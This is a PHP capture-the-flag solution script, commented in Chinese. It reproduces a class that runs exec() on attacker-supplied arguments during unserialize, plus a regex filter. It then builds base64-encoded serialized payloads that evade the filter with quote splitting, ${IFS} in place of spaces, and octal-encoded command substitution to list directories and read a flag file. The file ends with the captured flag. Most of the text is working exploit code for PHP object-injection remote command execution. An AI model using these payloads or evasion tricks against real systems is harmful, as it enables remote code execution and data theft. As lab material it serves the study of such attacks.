```php
<?php

//highlight_file(__FILE__);

  

class ease{

    private $method;

    private $args;

    function __construct($method, $args) {

        $this->method = $method;

        $this->args = $args;

    }

    function __destruct(){

        if (in_array($this->method, array("ping"))) {

            call_user_func_array(array($this, $this->method), $this->args);

        }

    }

    function ping($ip){

        exec($ip, $result);

        var_dump($result);

    }

    function waf($str){

        if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {

            return $str;

        } else {

            echo "don't hack";

        }

    }

    function __wakeup(){

        foreach($this->args as $k => $v) {

            $this->args[$k] = $this->waf($v);

        }

    }  

}

  

// $ctf=@$_POST['ctf'];

// @unserialize(base64_decode($ctf));

  

//1、获取当前目录下的文件

$e = new ease("ping", array('l""s${IFS}-l'));  

echo base64_encode(serialize($e));

//执行后，获得当前目录下存在目录：flag_1s_here

//2、获取 flag_1s_here 目录下的文件

$e = new ease("ping", array('l""s${IFS}-l${IFS}fl""ag_1s_here'));  //获取当前目录下的文件

echo base64_encode(serialize($e));

//执行后，获得 flag_1s_here 目录下存在文件 flag_831b69012c67b35f.php，浏览器访问后没有反应，说明只能查看该文件

//3、查看flag_831b69012c67b35f.php文件的内容，因为 /、;、|、& 都已经被过滤了，这里采用8进制绕过

//把 cat flag_1s_here/flag_831b69012c67b35f.php 转为8进制如下："\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160"

$a = array('$(printf${IFS}"\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160")');

$e = new ease("ping", $a);  

echo base64_encode(serialize($e));

//获取到flag：array(2) { [0]=> string(5) " string(47) "//$cyberpeace{e922462a49effa0bc1ac5410d01a89d2}" }

?>
```